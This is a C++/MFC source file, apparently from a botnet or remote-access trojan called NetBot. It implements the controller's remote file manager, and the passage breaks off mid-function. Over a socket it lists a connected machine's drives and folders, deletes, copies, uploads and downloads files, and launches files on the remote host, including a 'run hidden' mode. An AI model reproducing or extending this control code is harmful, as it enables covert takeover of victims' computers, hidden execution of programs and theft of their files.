// FileDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "FileDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CFileDlg dialog

CFileDlg::CFileDlg(CWnd* pParent /*=NULL*/) : CDialog(CFileDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFileDlg)
	m_CurrPath = _T("");
	//}}AFX_DATA_INIT
	bCopySel = FALSE;
	m_ConnSocket = INVALID_SOCKET;
	m_ViewStyle = LVS_REPORT;
	m_Buffer = new char[1536 * 1024]; //���ݽ����� 1.5MB
	m_hWorkThread = NULL;
}

CFileDlg::~CFileDlg()
{
	imgListTree.DeleteImageList();

	if (m_Buffer != NULL)
		delete[]m_Buffer;
}

void CFileDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFileDlg)
	DDX_Control(pDX, IDC_FILELIST, m_FileList);
	DDX_Control(pDX, IDC_FILETREE, m_FileTree);
	DDX_Text(pDX, IDC_EDIT_PATH, m_CurrPath);
	DDV_MaxChars(pDX, m_CurrPath, 200);
	//}}AFX_DATA_MAP

}


BEGIN_MESSAGE_MAP(CFileDlg, CDialog)
	//{{AFX_MSG_MAP(CFileDlg)
	ON_NOTIFY(NM_DBLCLK, IDC_FILELIST, OnDblclkFilelist)
	ON_NOTIFY(NM_CLICK, IDC_FILELIST, OnClickFilelist)
	ON_NOTIFY(NM_RCLICK, IDC_FILELIST, OnRclickFilelist)
	ON_COMMAND(ID_FILE_RUNNORMAL, OnFileRunnormal)
	ON_COMMAND(ID_FILE_RUNHIDE, OnFileRunhide)
	ON_COMMAND(ID_FILE_COPY, OnFileCopy)
	ON_COMMAND(ID_FILE_PASTE, OnFilePaste)
	ON_COMMAND(ID_FILE_DELETE, OnFileDelete)
	ON_COMMAND(ID_FILE_UPLOAD, OnFileUpload)
	ON_COMMAND(ID_FILE_DOWNLOAD, OnFileDownload)
	ON_COMMAND(ID_FILE_REFURSH, OnFileRefursh)
	ON_NOTIFY(TVN_SELCHANGED, IDC_FILETREE, OnSelchangedFiletree)
	ON_BN_CLICKED(IDC_BTN_ADDRGO, OnBtnAddrGo)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_FILELIST, OnColumnclickFilelist)
	//}}AFX_MSG_MAP
	ON_COMMAND(ID_FILE_BACKUP, OnFileBackup)
	ON_COMMAND(ID_FILE_CHGVIEW, OnFileViewChg)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileDlg message handlers
void CFileDlg::SetConnSocket(SOCKET socket)
{
	m_ConnSocket = socket;

	sockaddr_in addr;
	int cb = sizeof(addr);
	int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
	CString OnlineIP;
	OnlineIP.Format("%s:%d", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));//ntohs������u_longתint

	SetWindowText("[�ļ�����] " + OnlineIP);

	GetRootDrivers();
}

void CFileDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];

	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);

	m_wndStatusBar.SetText(tzText, iPane, 0);
}

BOOL CFileDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the small icon for this dialog
	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_FILE), FALSE);
	CenterWindow();

	// TODO: Add extra initialization here
	//Add toolbar===============================
	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT |
		TBSTYLE_LIST,
		WS_CHILD |
		WS_VISIBLE |
		CBRS_ALIGN_TOP |
		CBRS_GRIPPER |
		CBRS_TOOLTIPS,
		CRect(2, 2, 0, 0)) ||
		!m_wndToolBar.LoadToolBar(IDR_FILE_TOOLBAR))
	{
		TRACE0("failed to create toolbar\n");
		return FALSE;
	}
	//Add bitmap to toolbar
	m_wndToolBar.LoadTrueColorToolBar(16, IDB_FILETB_NORMAL, IDB_FILETB_HOT,
		IDB_FILETB_DISABLE);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
	VERIFY(m_wndToolBar.SetButtonText(0, "����"));
	VERIFY(m_wndToolBar.SetButtonText(1, "����"));
	VERIFY(m_wndToolBar.SetButtonText(2, "ճ��"));
	VERIFY(m_wndToolBar.SetButtonText(3, "ɾ��"));
	VERIFY(m_wndToolBar.SetButtonText(4, "�ϴ�"));
	VERIFY(m_wndToolBar.SetButtonText(5, "����"));
	VERIFY(m_wndToolBar.SetButtonText(6, "ˢ��"));
	VERIFY(m_wndToolBar.SetButtonText(7, "�鿴"));
	//m_wndToolBar.AddDropDownButton(this, ID_FILE_CHGVIEW, IDR_MENU_FILEVIEW);

	//create statusbar=============================
	m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM,
		CRect(0, 0, 0, 0), this, 0x1100001);
	int strPartDim[2] =
	{
		400, -1
	};
	m_wndStatusBar.SetParts(2, strPartDim);

	//���ز˵�====================================
	m_FileMenu.LoadMenu(IDR_MENU_FILERIGHT);

	// Initialize driver image lists
	imgListTree.Create(18, 18, ILC_COLOR24 | ILC_MASK, 0, 7);
	HBITMAP hBitmap = (HBITMAP)LoadImage(AfxGetResourceHandle(),
		MAKEINTRESOURCE(IDB_FOLDERS),
		IMAGE_BITMAP, 0, 0,
		LR_DEFAULTSIZE | LR_CREATEDIBSECTION);
	imgListTree.Add(CBitmap::FromHandle(hBitmap), RGB(255, 255, 255));
	::DeleteObject(hBitmap);
	m_FileTree.SetImageList(&imgListTree, TVSIL_NORMAL);
	m_FileTree.InsertItem("Զ�̵���", 2, 2, 0, 0);

	//===========================================

	//	ListView_SetExtendedListViewStyle(m_FileList.m_hWnd,LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);
	m_FileList.InsertColumn(0, "�ļ���", LVCFMT_LEFT, 200);
	m_FileList.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_FileList.InsertColumn(2, "��С", LVCFMT_LEFT, 90);
	m_FileList.InsertColumn(3, "�޸�ʱ��", LVCFMT_LEFT, 250);
	//���б�ؼ�����ͼ���б�
	m_FileList.SetImageList(&((CNetBotApp *)AfxGetApp())->m_SmallImgList,
		LVSIL_SMALL);
	m_FileList.SetImageList(&((CNetBotApp *)AfxGetApp())->m_LargeImgList,
		LVSIL_NORMAL);

	return TRUE;
}

void CFileDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	CDialog::PostNcDestroy();
	//delete�����Ի�����new������ָ��
	delete this;
}

void CFileDlg::OnCancel()
{
	StopWork();

	//��ģʽ�Ի�����Ҫ�������ٶԻ���
	DestroyWindow();
	//CDialog::OnCancel();
}

BOOL CFileDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (nVirtKey == VK_RETURN)
		{
			//����ǻس�����������Ҫ��������,����ʲôҲ����
			return TRUE;
		}
		if (nVirtKey == VK_ESCAPE)
		{
			//�����ESC����������Ҫ��������,����ʲôҲ����
			//�ж��ļ�ö���߳�
			DWORD dwExitCode;
			if (m_hWorkThread != NULL)
			{
				WaitForSingleObject(m_hWorkThread, 100);
				if (GetExitCodeThread(m_hWorkThread, &dwExitCode))
				{
					if (dwExitCode == STILL_ACTIVE)
						TerminateThread(m_hWorkThread, dwExitCode);
				}

				OnWorkEnd();
			}

			return TRUE;
		}
	}

	return CDialog::PreTranslateMessage(pMsg);
}

int CFileDlg::GetIconIndex(LPCTSTR lpszPath, BOOL bIsDir, BOOL bSelected)
{
	SHFILEINFO sfi;
	memset(&sfi, 0, sizeof(sfi));

	if (bIsDir)
	{
		SHGetFileInfo(lpszPath, FILE_ATTRIBUTE_DIRECTORY, &sfi, sizeof(sfi),
			SHGFI_SMALLICON |
			SHGFI_SYSICONINDEX |
			SHGFI_USEFILEATTRIBUTES |
			(bSelected ? SHGFI_OPENICON : 0));
		return  sfi.iIcon;
	}

	SHGetFileInfo(lpszPath, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(sfi),
		SHGFI_SMALLICON |
		SHGFI_SYSICONINDEX |
		SHGFI_USEFILEATTRIBUTES |
		(bSelected ? SHGFI_OPENICON : 0));

	return sfi.iIcon;
}


void CFileDlg::OnWorkBegin()
{
	m_FileList.EnableWindow(FALSE);
	m_FileTree.EnableWindow(FALSE);
}

void CFileDlg::OnWorkEnd()
{
	m_FileList.EnableWindow(TRUE);
	m_FileTree.EnableWindow(TRUE);

	CloseHandle(m_hWorkThread);
	m_hWorkThread = NULL;
}

DWORD CFileDlg::ListDriver()
{
	OnWorkBegin();

	//���ͻ�ȡ�̷�����
	m_MsgHead.dwCmd = CMD_FILEDRIVER;
	m_MsgHead.dwSize = 0;

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != 0)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "��ȡԶ�̵��Դ���ʧ��");
		OnWorkEnd();
		return 0;
	}

	//��ʾԶ�̴���
	m_FileList.DeleteAllItems();

	DWORD dwNum = m_MsgHead.dwSize / sizeof(DriverInfo);
	BYTE* m_DesBuf = (LPBYTE)m_Buffer;
	LPDriverInfo pInfo = (LPDriverInfo)m_DesBuf;
	int iImage = 0, iSelectedImage = 0;
	HTREEITEM hTreeRoot = m_FileTree.GetRootItem();

	for (DWORD i = 0; i < dwNum; i++)
	{
		//����̷�
		switch (pInfo[i].drivertype)
		{
		case DRIVE_REMOVABLE:
			// ���ƶ�������
		{
			iImage = 4;
			iSelectedImage = 4;
		}
		break;
		case DRIVE_REMOTE:
			// ����������
		{
			iImage = 6;
			iSelectedImage = 6;
		}
		break;
		case DRIVE_CDROM:
			// CD-ROM
		{
			iImage = 5;
			iSelectedImage = 5;
		}
		break;
		case DRIVE_FIXED:
			// �̶���������
		{
			iImage = 3;
			iSelectedImage = 3;
		}
		break;
		default:
			//����ʶ����������������ʾ
		{
			pInfo[i].display[1] = 0;
		}
		break;
		}

		//Win2000����յ�һЩ������̷�
		if (strlen(pInfo[i].display) < 2)
			continue;

		//��������
		HTREEITEM hItem = m_FileTree.InsertItem(pInfo[i].display, iImage,
			iSelectedImage, hTreeRoot, 0);
		m_FileTree.SetItemData(hItem, (DWORD)pInfo[i].driver[0]);
	}

	m_FileTree.Expand(hTreeRoot, TVE_EXPAND);

	StatusTextOut(0, "��ȡԶ�̴��̳ɹ�");
	OnWorkEnd();
	return 0;
}

DWORD CFileDlg::ListDirectory()
{
	OnWorkBegin();

	//���ͻ�ȡ�̷�����
	m_MsgHead.dwCmd = CMD_FILEDIRECTORY;
	m_MsgHead.dwSize = m_SendPath.GetLength();
	lstrcpy(m_Buffer, m_SendPath);

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != 0)
	{
		//���ݴ���ʧ��
		if (m_MsgHead.dwCmd == CMD_DIRFLODERERR)
			StatusTextOut(0, "Ŀ¼���ܷ���");
		else
			StatusTextOut(0, "��ȡԶ��Ŀ¼ʧ��");
		OnWorkEnd();
		return 0;
	}

	//��ʾ�ļ��б�
	m_FileList.DeleteAllItems();

	DWORD dwNum = m_MsgHead.dwSize / sizeof(FileInfo);
	BYTE* m_DesBuf = (LPBYTE)m_Buffer;
	LPFileInfo pInfo = (LPFileInfo)m_DesBuf;

	for (DWORD i = 0; i < dwNum; i++)
	{
		//��ʾʱ���ļ��������棬�ļ�������
		int iIcon = 0, iInsertItem = 0;
		if (pInfo[i].iType == 2)//�ļ�
		{
			iIcon = GetIconIndex(pInfo[i].cFileName, FALSE);
			iInsertItem = m_FileList.GetItemCount();
		}
		if (pInfo[i].iType == 1)//�ļ���
		{
			iIcon = GetIconIndex(pInfo[i].cFileName, TRUE);
			lstrcpy(pInfo[i].cAttrib, "�ļ���");
			iInsertItem = 0;
		}

		m_FileList.InsertItem(iInsertItem, "", iIcon);
		m_FileList.SetItemData(iInsertItem, pInfo[i].iType);
		m_FileList.SetItemText(iInsertItem, 0, pInfo[i].cFileName);
		m_FileList.SetItemText(iInsertItem, 1, pInfo[i].cAttrib);
		m_FileList.SetItemText(iInsertItem, 2, pInfo[i].cSize);
		m_FileList.SetItemText(iInsertItem, 3, pInfo[i].cTime);
	}

	StatusTextOut(0, "��ȡԶ���ļ��б�ɹ�");
	StatusTextOut(1, "�����ļ����ļ���%d��", dwNum);
	OnWorkEnd();
	return 0;
}

DWORD CFileDlg::FileDelete()
{
	OnWorkBegin();

	int nItem = m_FileList.GetNextItem(-1, LVNI_SELECTED);

	FileOpt m_FileOpt;
	memset(&m_FileOpt, 0, sizeof(FileOpt));
	strncpy(m_FileOpt.cScrFile, m_SendPath, 99);

	//���ͻ�ȡ�̷�����
	m_MsgHead.dwCmd = CMD_FILEDELETE;
	m_MsgHead.dwSize = sizeof(FileOpt);
	memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
		m_Buffer,
		&m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ɾ���ļ�ʧ��");
		OnWorkEnd();
		return 0;
	}

	//ɾ�����ļ�
	m_FileList.DeleteItem(nItem);

	StatusTextOut(0, "ɾ���ļ��ɹ�");
	OnWorkEnd();
	return 0;
}

DWORD CFileDlg::FileExecNormal()
{
	OnWorkBegin();

	FileOpt m_FileOpt;
	memset(&m_FileOpt, 0, sizeof(FileOpt));
	m_FileOpt.iSize = 1;//��������
	strncpy(m_FileOpt.cScrFile, m_SendPath, 99);

	//����[��������]����
	m_MsgHead.dwCmd = CMD_FILEEXEC;
	m_MsgHead.dwSize = sizeof(FileOpt);
	memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
		m_Buffer,
		&m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "���ļ�ʧ��");
		OnWorkEnd();
		return 0;
	}

	StatusTextOut(0, "���ļ��ɹ�");
	OnWorkEnd();
	return 0;
}

DWORD CFileDlg::FileExecHide()
{
	OnWorkBegin();

	FileOpt m_FileOpt;
	memset(&m_FileOpt, 0, sizeof(FileOpt));
	m_FileOpt.iSize = -1;//��������
	strncpy(m_FileOpt.cScrFile, m_SendPath, 99);

	//����[��������]����
	m_MsgHead.dwCmd = CMD_FILEEXEC;
	m_MsgHead.dwSize = sizeof(FileOpt);
	memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
		m_Buffer,
		&m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "���ش��ļ�ʧ��");
		OnWorkEnd();
		return 0;
	}

	StatusTextOut(0, "���ش��ļ��ɹ�");
	OnWorkEnd();
	return 0;
}

DWORD CFileDlg::FilePaste()
{
	OnWorkBegin();

	CString temp;
	temp = m_CurrPath + "\\" + m_CopyPath.Right(m_CopyPath.GetLength() -
		m_CopyPath.ReverseFind('\\') -
		1);
	if (temp == m_CopyPath)
	{
		temp = m_CurrPath +
			"\\����" +
			m_CopyPath.Right(m_CopyPath.GetLength() -
				m_CopyPath.ReverseFind('\\') -
				1);
	}

	FileOpt m_FileOpt;
	memset(&m_FileOpt, 0, sizeof(FileOpt));
	strncpy(m_FileOpt.cScrFile, m_CopyPath, 99);
	strncpy(m_FileOpt.cDstFile, temp, 99);

	//����[ճ��]����
	m_MsgHead.dwCmd = CMD_FILEPASTE;
	m_MsgHead.dwSize = sizeof(FileOpt);
	memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
		m_Buffer,
		&m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "����ճ���ļ�ʧ��");
		OnWorkEnd();
		return 0;
	}

	StatusTextOut(0, "����ճ���ļ��ɹ�");
	OnWorkEnd();
	return 0;
}

DWORD CFileDlg::FileUpLoad()
{
	OnWorkBegin();

	//��ȡ�ϴ��ļ�·��
	CString FileSavePath, FileOpenName;
	TCHAR FileOpenPath[MAX_PATH];

	OPENFILENAME ofn;
	ZeroMemory(&ofn, sizeof(ofn));
	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = m_hWnd;
	ofn.lpstrFile = FileOpenPath;
	ofn.lpstrFile[0] = _T('\0');
	ofn.nMaxFile = sizeof(FileOpenPath);
	ofn.lpstrFilter = _T("�ϴ��ļ�(*.*)\0*.*\0\0");
	ofn.nFilterIndex = 1;
	ofn.lpstrFileTitle = NULL;
	ofn.nMaxFileTitle = 0;
	ofn.lpstrInitialDir = NULL;
	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
	if (!GetOpenFileName(&ofn))
	{
		OnWorkEnd();
		return 0;
	}

	///////////////////////////////////////////////////
	FileOpenName = ExtractNameFromFullPath(FileOpenPath);
	FileSavePath = m_CurrPath + "\\" + FileOpenName;

	FileOpt m_FileOpt;
	memset(&m_FileOpt, 0, sizeof(FileOpt));
	strncpy(m_FileOpt.cScrFile, FileSavePath, 99);
	strncpy(m_FileOpt.cDstFile, FileOpenPath, 99);

	//����[�ϴ��ļ�]����
	m_MsgHead.dwCmd = CMD_FILEUPSTART;
	m_MsgHead.dwSize = sizeof(FileOpt);
	memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
		m_Buffer,
		&m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "�ϴ��ļ�ʧ��");
		OnWorkEnd();
		return 0;
	}

	StatusTextOut(0, "");
	OnWorkEnd();
	return 0;
}

DWORD CFileDlg::FileDownLoad()
{
	OnWorkBegin();

	//��ȡ�ļ����ر���·��
	TCHAR szSaveFile[MAX_PATH];
	lstrcpy(szSaveFile, ExtractNameFromFullPath(m_SendPath));//���Ĭ���ļ���
	AfxMessageBox(szSaveFile);
	OPENFILENAME ofn;
	ZeroMemory(&ofn, sizeof(ofn));
	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = GetSafeHwnd();
	ofn.lpstrFile = szSaveFile;
	ofn.nMaxFile = sizeof(szSaveFile);
	ofn.lpstrFilter = _T("�����ļ�(*.*)\0*.*\0\0");
	ofn.nFilterIndex = 1;
	ofn.lpstrFileTitle = NULL;
	ofn.nMaxFileTitle = 0;
	ofn.lpstrInitialDir = NULL;
	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
	if (!GetSaveFileName(&ofn))
	{
		OnWorkEnd();
		return 0;
	}

	///////////////////////////////////////////////////

	FileOpt m_FileOpt;
	memset(&m_FileOpt, 0, sizeof(FileOpt));
	strncpy(m_FileOpt.cScrFile, m_SendPath, 99);
	strncpy(m_FileOpt.cDstFile, szSaveFile, 99);

	//����[�����ļ�]����
	m_MsgHead.dwCmd = CMD_FILEDOWNSTART;
	m_MsgHead.dwSize = sizeof(FileOpt);
	memcpy(m_Buffer, &m_FileOpt, sizeof(FileOpt));

	//���ݴ���ͬʱ��������
	if (!SendMsg(m_ConnSocket, m_Buffer, &m_MsgHead) || !RecvMsg(m_ConnSocket,
		m_Buffer,
		&m_MsgHead))
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "ͨ��ʧ��");
		OnWorkEnd();
		return 0;
	}
	if (m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		//���ݴ���ʧ��
		StatusTextOut(0, "�����ļ�ʧ��");
		OnWorkEnd();
		return 0;
	}

	StatusTextOut(0, "");
	OnWorkEnd();
	return 0;
}

CString CFileDlg::ExtractNameFromFullPath(CString szFullPath)
{
	char path_buffer[_MAX_PATH];
	char fname[_MAX_FNAME];
	char ext[_MAX_EXT];
	lstrcpy(path_buffer, szFullPath);
	_splitpath(path_buffer, NULL, NULL, fname, ext);

	return CString(fname) + CString(ext);
}

void CFileDlg::GetRootDrivers()
{
	// TODO: Add your control notification handler code here
	//��ȡԶ���̷�
	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDriver);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "��ȡԶ�̵��Դ���ʧ��");
}

void CFileDlg::StopWork()
{
	//�ر�socket
	shutdown(m_ConnSocket, 0x02);
	closesocket(m_ConnSocket);

	//���������߳�
	DWORD dwExitCode;
	if (m_hWorkThread != NULL)
	{
		WaitForSingleObject(m_hWorkThread, 100);
		if (GetExitCodeThread(m_hWorkThread, &dwExitCode))
		{
			if (dwExitCode == STILL_ACTIVE)
				TerminateThread(m_hWorkThread, dwExitCode);
		}
		m_hWorkThread = NULL;
	}
}

void CFileDlg::OnSelchangedFiletree(NMHDR* pNMHDR, LRESULT* pResult)
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	HTREEITEM hSelItem = m_FileTree.GetSelectedItem();  	 //��ȡ��ǰѡ�н��
	//HTREEITEM hSelItem = pNMTreeView->itemNew.hItem;//�����û��򿪵������ڵ���
	if (hSelItem == NULL)
		return;
	if (hSelItem == m_FileTree.GetRootItem())
		return;

	DWORD ch = m_FileTree.GetItemData(hSelItem);
	if (ch == 'A' || ch == 'B')//A,B�̲�����
		return;

	//���õ�ǰĿ¼
	m_CurrPath.Format("%c:", (char)ch);
	UpdateData(FALSE);
	//ƴ���о�·��
	m_SendPath = m_CurrPath + "\\*";
	//�о�Ŀ¼

	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "��ȡԶ��Ŀ¼�б�ʧ��");

	*pResult = 0;
}

void CFileDlg::OnFileBackup()
{
	// TODO: Add your command handler code here
	//��ȡ��һ��Ŀ¼·��
	if (m_CurrPath.GetLength() < 3)//��Ŀ¼
		return;
	m_SendPath = m_CurrPath;
	int pos = m_SendPath.ReverseFind('\\');
	m_CurrPath = m_SendPath.Left(pos);
	UpdateData(FALSE);
	//ƴ���о�·��
	m_SendPath = m_CurrPath + "\\*";
	//�о�Ŀ¼
	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "��ȡԶ��Ŀ¼�б�ʧ��");
}

void CFileDlg::OnFileViewChg()
{
	// TODO: Add your command handler code here
	switch (m_ViewStyle)
	{
	case LVS_ICON:
	{
		m_FileList.ModifyStyle(m_ViewStyle, LVS_REPORT);
		m_ViewStyle = LVS_REPORT;
	}
	break;
	case LVS_REPORT:
	{
		m_FileList.ModifyStyle(m_ViewStyle, LVS_SMALLICON);
		m_ViewStyle = LVS_SMALLICON;
	}
	break;
	case LVS_SMALLICON:
	{
		m_FileList.ModifyStyle(m_ViewStyle, LVS_LIST);
		m_ViewStyle = LVS_LIST;
	}
	break;
	case LVS_LIST:
	{
		m_FileList.ModifyStyle(m_ViewStyle, LVS_ICON);
		m_ViewStyle = LVS_ICON;
	}
	break;
	default:
		break;
	}
}


void CFileDlg::OnDblclkFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_FileTree.SelectItem(NULL);
	//˫���ļ��д�
	POSITION pos = m_FileList.GetFirstSelectedItemPosition();
	int iCurrSel = m_FileList.GetNextSelectedItem(pos);
	if (iCurrSel < 0)
		return;//δѡ�к�������

	if (1 == m_FileList.GetItemData(iCurrSel))//�ļ���
	{
		CString m_SelItem = m_FileList.GetItemText(iCurrSel, 0);
		m_CurrPath += "\\";
		m_CurrPath += m_SelItem;
		UpdateData(FALSE);

		//ƴ���о�·��
		m_SendPath = m_CurrPath + "\\*";
		//�о�Ŀ¼
		m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

		if (m_hWorkThread == NULL)
			StatusTextOut(0, "��ȡԶ��Ŀ¼�б�ʧ��");
	}

	*pResult = 0;
}

//���������ѡ���ļ�
void CFileDlg::OnClickFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_FileTree.SelectItem(NULL);
	//������װ�ļ�·��
	POSITION pos = m_FileList.GetFirstSelectedItemPosition();
	int iCurrSel = m_FileList.GetNextSelectedItem(pos);
	if (iCurrSel >= 0)
	{
		CString m_SelFile = m_FileList.GetItemText(iCurrSel, 0);
		m_SendPath = m_CurrPath + "\\" + m_SelFile;
	}
	else//iCurrSel < 0,δѡ�к�������
	{
		m_SendPath = m_CurrPath;
	}
	StatusTextOut(0, m_SendPath);

	//�˵�����������ʹ�ܴ���
	CMenu* pSubMenu = m_FileMenu.GetSubMenu(0);
	CToolBarCtrl* pToolBar = (CToolBarCtrl*)&m_wndToolBar.GetToolBarCtrl();

	if (iCurrSel < 0)//δѡ�к�������
	{
		pSubMenu->EnableMenuItem(ID_FILE_RUNNORMAL, MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_RUNHIDE, MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_ENABLED);//--
		pSubMenu->EnableMenuItem(ID_FILE_DELETE, MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_ENABLED);//--
		pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_GRAYED);
		pSubMenu->EnableMenuItem(ID_FILE_REFURSH, MF_ENABLED);//--

		pToolBar->EnableButton(ID_FILE_COPY, FALSE);
		pToolBar->EnableButton(ID_FILE_PASTE, TRUE);
		pToolBar->EnableButton(ID_FILE_DELETE, FALSE);
		pToolBar->EnableButton(ID_FILE_UPLOAD, TRUE);
		pToolBar->EnableButton(ID_FILE_DOWNLOAD, FALSE);
		pToolBar->EnableButton(ID_FILE_REFURSH, TRUE);
	}
	if (iCurrSel >= 0)
	{
		if (2 == m_FileList.GetItemData(iCurrSel))//�ļ�
		{
			pSubMenu->EnableMenuItem(ID_FILE_RUNNORMAL, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_RUNHIDE, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_DELETE, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_REFURSH, MF_ENABLED);//--

			pToolBar->EnableButton(ID_FILE_COPY, TRUE);
			pToolBar->EnableButton(ID_FILE_PASTE, TRUE);
			pToolBar->EnableButton(ID_FILE_DELETE, TRUE);
			pToolBar->EnableButton(ID_FILE_UPLOAD, TRUE);
			pToolBar->EnableButton(ID_FILE_DOWNLOAD, TRUE);
			pToolBar->EnableButton(ID_FILE_REFURSH, TRUE);
		}
		else
		{
			pSubMenu->EnableMenuItem(ID_FILE_RUNNORMAL, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_RUNHIDE, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_COPY, MF_GRAYED);
			pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_DELETE, MF_GRAYED);
			pSubMenu->EnableMenuItem(ID_FILE_UPLOAD, MF_ENABLED);//--
			pSubMenu->EnableMenuItem(ID_FILE_DOWNLOAD, MF_GRAYED);
